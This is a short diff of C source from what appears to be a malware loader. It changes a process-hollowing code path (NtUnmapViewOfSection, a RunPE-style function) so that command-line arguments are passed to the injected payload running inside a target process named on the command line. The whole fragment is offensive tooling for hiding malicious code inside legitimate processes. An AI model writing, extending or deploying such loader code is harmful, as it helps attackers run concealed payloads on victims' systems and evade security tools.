@@ -40,7 +40,7 @@ DWORD get_pid_by_name(char *imgname);
 #endif
 #ifdef PROCESS_HOLLOWING
 typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);
-void newRunPE(LPSTR szFilePath, PVOID pFile);
+void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine);
 #endif
 
 int main (int argc, char **argv)
@@ -145,7 +145,18 @@ int main (int argc, char **argv)
 	#ifdef PROCESS_HOLLOWING
 	// Instanciate target process
 	// Target process specified in first bfg argument argv[1]	
-	newRunPE(argv[1], payload);
+	// Command line arguments for payload in second bfg argument argv[2]
+	if(!argv[2]) 
+	{
+		// Handle empty command line arguments for payload executable
+		// Relevant if user does not specify "" as second bfg argument
+		newRunPE(argv[1], payload, "");
+	} else
+	{
+		// Instanciate and pass command line arguments
+		newRunPE(argv[1], payload, argv[2]);
+	}
+	
 	#endif
 
 	#ifdef LOADEXEC_DLL
